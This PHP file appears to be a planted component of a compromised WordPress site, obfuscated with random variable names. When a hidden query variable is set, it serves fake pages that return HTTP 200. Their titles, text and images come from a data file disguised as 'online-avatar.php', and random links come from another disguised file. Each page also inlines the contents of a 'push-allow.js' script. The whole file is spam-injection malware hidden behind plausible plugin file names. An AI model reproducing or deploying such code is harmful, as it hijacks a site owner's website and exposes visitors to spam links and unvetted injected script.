<?php
$zAcdgtGmqe = intval(get_query_var('mfboynsfp'));

if ($zAcdgtGmqe < 1 || $zAcdgtGmqe > 2855) return;
$x0S1UGmQ = file(plugin_dir_path(__FILE__).'online-avatar.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$tplDXAVj = explode(';', $x0S1UGmQ[$zAcdgtGmqe]);
if (count($tplDXAVj) < 2) return;
$ivN6Z6l1nQ = $tplDXAVj[0];
$qriM6f25m  = $tplDXAVj[1];
$nTxYExYIUb = $tplDXAVj[2];
$pHyxd0OqK  = $tplDXAVj[3];
$tLfwgBoa = $tplDXAVj[4];
set_query_var('gkjxa', $ivN6Z6l1nQ);

$d0fPmvn2W = '';
$nnVlxuQ = plugin_dir_path(__FILE__).'nextgen-gamipress.php';
if (is_file($nnVlxuQ)) {
	$qcflTn7NoD = file($nnVlxuQ, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($qcflTn7NoD);
	shuffle($qcflTn7NoD);
	$vRXdkOgfdf = mt_rand(2, 5);
	if (count($qcflTn7NoD) > $vRXdkOgfdf) {
		for ($eBS0pyXuZo = 0; $eBS0pyXuZo < $vRXdkOgfdf; $eBS0pyXuZo++) {
			$brh34FVQI = array_shift($qcflTn7NoD);
			$d0fPmvn2W .= '<p><a href="'.$brh34FVQI.'">'.$brh34FVQI.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $ivN6Z6l1nQ; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $qriM6f25m . "</p>\n";
				if (strlen($pHyxd0OqK) > 0) echo "<p>" . $pHyxd0OqK . "</p>\n";
				if (strlen($nTxYExYIUb) > 0) echo "<p>" . $nTxYExYIUb . "</p>\n";
				if (strlen($tLfwgBoa) > 0) echo '<p><a href="#"><img src="'.$tLfwgBoa.'"></a>' . "</p>\n";
				echo $d0fPmvn2W;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$jLoyN06 = plugin_dir_path(__FILE__) . 'push-allow.js';
if (is_file($jLoyN06)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($jLoyN06);
	echo '</script>';
}
get_footer();
?>
